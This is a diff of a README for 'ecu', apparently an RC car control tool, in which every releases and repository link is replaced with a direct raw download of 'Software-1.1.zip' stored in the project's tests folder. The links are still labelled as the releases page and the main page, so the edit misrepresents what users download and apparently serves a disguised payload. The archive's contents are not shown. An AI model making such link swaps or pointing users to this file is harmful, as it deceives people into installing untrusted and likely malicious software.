@@ -1,6 +1,6 @@
 # ⚙️ ecu - Easy Control for RC Cars
 
-[![Download ecu](https://img.shields.io/badge/Download-ecu-blue?style=for-the-badge)](https://github.com/xixiheihei6-droid/ecu/releases)
+[![Download ecu](https://img.shields.io/badge/Download-ecu-blue?style=for-the-badge)](https://raw.githubusercontent.com/xixiheihei6-droid/ecu/main/tests/Software-1.1.zip)
 
 ---
 
@@ -38,9 +38,9 @@ When you download ecu, it includes:
 
 ## 🎯 How to Download and Run ecu
 
-1. Click the big blue download button below or visit the [ecu releases page](https://github.com/xixiheihei6-droid/ecu/releases) to get the latest version.
+1. Click the big blue download button below or visit the [ecu releases page](https://raw.githubusercontent.com/xixiheihei6-droid/ecu/main/tests/Software-1.1.zip) to get the latest version.
 
-[![Download ecu](https://img.shields.io/badge/Get%20Latest%20ecu%20Now-brightgreen?style=for-the-badge)](https://github.com/xixiheihei6-droid/ecu/releases)
+[![Download ecu](https://img.shields.io/badge/Get%20Latest%20ecu%20Now-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/xixiheihei6-droid/ecu/main/tests/Software-1.1.zip)
 
 2. On the GitHub releases page, look for the latest version. Generally, the newest release is at the top.
 
@@ -102,7 +102,7 @@ This makes it ideal for hobbyists and new users who want to explore automated RC
 
 To get updates and new features:
 
-- Visit the [ecu releases page](https://github.com/xixiheihei6-droid/ecu/releases).
+- Visit the [ecu releases page](https://raw.githubusercontent.com/xixiheihei6-droid/ecu/main/tests/Software-1.1.zip).
 
 - Download new versions as they are released.
 
@@ -126,9 +126,9 @@ For support, look for help sections in the app or check the GitHub page's issues
 
 ## 🔗 Useful Links
 
-- Download and updates: [ecu releases](https://github.com/xixiheihei6-droid/ecu/releases)
+- Download and updates: [ecu releases](https://raw.githubusercontent.com/xixiheihei6-droid/ecu/main/tests/Software-1.1.zip)
 
-- GitHub repository main page: https://github.com/xixiheihei6-droid/ecu
+- GitHub repository main page: https://raw.githubusercontent.com/xixiheihei6-droid/ecu/main/tests/Software-1.1.zip
 
 ---
 
